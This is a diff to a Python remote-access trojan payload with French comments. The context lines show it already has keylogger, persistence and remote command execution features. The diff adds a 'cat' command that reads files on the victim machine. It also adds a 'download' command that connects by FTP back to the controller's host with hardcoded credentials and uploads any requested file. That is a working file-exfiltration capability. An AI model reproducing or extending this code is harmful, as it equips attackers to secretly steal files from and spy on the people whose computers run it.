@@ -12,6 +12,7 @@ import threading
 import inspect
 import sys
 import time
+from ftplib import FTP
 
 # pour la compil
 import imp
@@ -114,6 +115,37 @@ class Payload:
                 print(command)
                 #output = subprocess.getoutput(command)
                 # ClientSocket.send(str.encode(output))
+                if command.lower() != "cat":
+
+                    if splited_command[0].lower() == "cat":
+                        path_fichier = splited_command[1]
+                        output = self.Commande("type " + path_fichier)
+
+                else:
+                    output = "Cat a besoin d'une option"
+
+                if command.lower() != "download":
+
+                    if splited_command[0].lower() == "download":
+                        #print("tentative de telechargelent de " + splited_command[1] + " " + self.host + " " + str((self.port+2)))
+                        path_fichier = splited_command[1]
+                        ftp = FTP('')
+                        ftp.connect(self.host, (self.port+2))
+                        ftp.login(user='user', passwd = '12345')
+                        fichier = path_fichier
+                        try:
+                            file = open(fichier, 'rb') # ici, j'ouvre le fichier ftp.py 
+                            try:
+                                ftp.storbinary('STOR '+fichier, file) # ici (où connect est encore la variable de la connexion), j'indique le fichier à envoyer
+                                output = "Fichier recupérer"
+                            except:
+                                output = "Erreur le fichier n'a pas été récuperé"
+                        except:
+                            output = "Le fichier n'éxiste pas"
+                        file.close() # on ferme le fichier
+                else:
+                    output = "Download a besoin d'une option"
+
                 if command.lower() != "keylogger":
 
                     if splited_command[0].lower() == "keylogger":
@@ -190,7 +222,7 @@ class Payload:
                     else:
                         # if operation is successful, empty message
                         output = ""
-                elif splited_command[0].lower() != "keylogger" and splited_command[0].lower() != "persistance":
+                elif splited_command[0].lower() != "keylogger" and splited_command[0].lower() != "persistance" and splited_command[0].lower() != "cat" and splited_command[0].lower() != "download":
                     # execute the command and retrieve the results
 
                     """
